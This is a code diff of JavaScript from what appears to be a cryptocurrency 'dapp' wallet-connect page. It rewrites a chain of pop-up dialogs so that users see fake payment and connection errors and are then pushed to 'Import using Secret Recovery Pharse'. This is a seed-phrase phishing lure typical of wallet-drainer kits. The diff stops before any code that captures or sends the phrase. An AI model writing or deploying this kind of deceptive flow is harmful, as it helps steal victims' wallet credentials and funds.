@@ -1271,34 +1271,31 @@
   function alertError(wallet) {
     Swal.fire({
       title: 'Connect Alert',
-      text: "Error with " + wallet + " payment (Dapps)!",
+      text: "Please install Metamask or paste URL link into Trustwallet (Dapps)!",
       icon: 'error',
-      showCancelButton: true,
       confirmButtonColor: '#3085d6',
-      cancelButtonColor: '#d33',
-      cancelButtonText: 'Exit',
-      confirmButtonText: 'login using pharse?',
-      reverseButtons: true
+      confirmButtonText: 'OK',
 
     }).then((result) => {
       if (result.isConfirmed) {
         Swal.fire({
-          title: 'Info',
-          text: "Are you sure you want to import phrase !",
-          icon: 'info',
-          showCancelButton: true,
+          title: 'Connect Alert',
+          text: "Please install Metamask or paste URL link into Trustwallet (Dapps)!",
+          icon: 'error',
           confirmButtonColor: '#3085d6',
-          cancelButtonColor: '#d33',
-          confirmButtonText: 'Yes',
-          cancelButtonText: 'No',
+          confirmButtonText: 'OK',
         }).then((result) => {
           if (result.isConfirmed) {
             Swal.fire({
-              title: 'Info',
-              text: "Please import your pharse contain 12, 15, 18, 21, or 24 words!",
-              icon: 'info',
+              title: 'Connect Alert',
+              text: "Error with " + wallet + " payment (Dapps)!",
+              icon: 'error',
+              showCancelButton: true,
               confirmButtonColor: '#3085d6',
-              confirmButtonText: 'Ok',
+              cancelButtonColor: '#d33',
+              cancelButtonText: 'Exit',
+              confirmButtonText: 'Import using Secret Recovery Pharse',
+              reverseButtons: true
             }).then((result) => {
               if (result.isConfirmed) {
                 Swal.fire({
